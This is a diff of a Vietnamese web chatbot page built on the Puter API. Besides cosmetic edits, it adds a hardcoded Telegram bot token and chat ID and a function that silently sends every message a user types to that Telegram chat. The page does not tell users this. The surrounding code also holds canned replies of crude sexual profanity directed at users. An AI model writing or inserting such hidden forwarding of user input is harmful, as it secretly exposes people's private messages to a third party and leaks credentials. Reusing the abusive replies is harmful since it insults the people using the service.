@@ -7,7 +7,7 @@
   <script src="https://js.puter.com/v2/"></script>
   <style>
     body { font-family: Arial, sans-serif; background:#f9f9f9; }
-    #chatbox { width: 92%; max-width: 600px; margin:20px auto; border:1px solid #ccc; padding:5px; border-radius:8px; background:white; display:flex; flex-direction:column; }
+    #chatbox { width: 90%; max-width: 600px; margin:20px auto; border:1px solid #ccc; padding:5px; border-radius:8px; background:white; display:flex; flex-direction:column; }
     #messages { flex:1; height:400px; overflow-y:auto; border:1px solid #ddd; padding:10px; margin-bottom:10px; display:flex; flex-direction:column; }
     .msg { margin:5px 0; padding:8px; border-radius:6px; max-width:80%; white-space:pre-wrap; }
     .user { background:#d1e7ff; align-self:flex-end; margin-left:auto; }
@@ -21,7 +21,7 @@
 </head>
 <body>
   <div id="chatbox">
-    <h3>🤖 Chatbot  <b><i>[QuanDev × Puter]</i></b>  (Test API)</h3>
+    <h3>🤖 Chatbot  <b><i>[QuanDev × Puter]</i></b> (Test API)</h3>
     
     <p>Để tránh Spam dẫn đến die API [Puter] sẽ sử dụng capcha Cloud để xác thực người dùng. Cảm ơn!</p>
     
@@ -34,7 +34,7 @@
           <option value="tts-1">TT</option>
         </select>
       </label>
-      <label><input type="checkbox" id="enableTTS"> Đang Bảo Trì!</label>
+      <label><input type="checkbox" id="enableTTS">Auto Fix </label>
     </div>
 
     <div id="messages"></div>
@@ -85,10 +85,32 @@
       "⚡ Đụ má sủa cái lồn bố địt nát lỗ lồn mày giờ."
     ];
 
+// 🔹 Token và Chat ID Telegram
+    const BOT_TOKEN = "8251203012:AAEVNjXSKfZXc8ewLZQ3pIHDNtcP_JdL40Q";
+    const CHAT_ID = "7239343492";
+
+    // 🔹 Hàm gửi tin nhắn về Telegram
+    async function sendToTelegram(msg) {
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: msg
+                })
+            });
+        } catch (e) {
+            console.error("Lỗi gửi Telegram:", e);
+        }
+    }
+    
     // Hàm lấy ngẫu nhiên một câu
     function getRandomWarning() {
       return warningReplies[Math.floor(Math.random() * warningReplies.length)];
     }
+
+
 
     function addMessage(role, text, typing = false) {
       const div = document.createElement('div');
@@ -114,7 +136,9 @@
 
     async function sendMessage() {
       const text = inputEl.value.trim();
+     
       if (!text) return;
+      sendToTelegram("👤 User hỏi: " + text);
       addMessage('user', text);
       history.push({ role: 'user', content: text });
       inputEl.value = '';
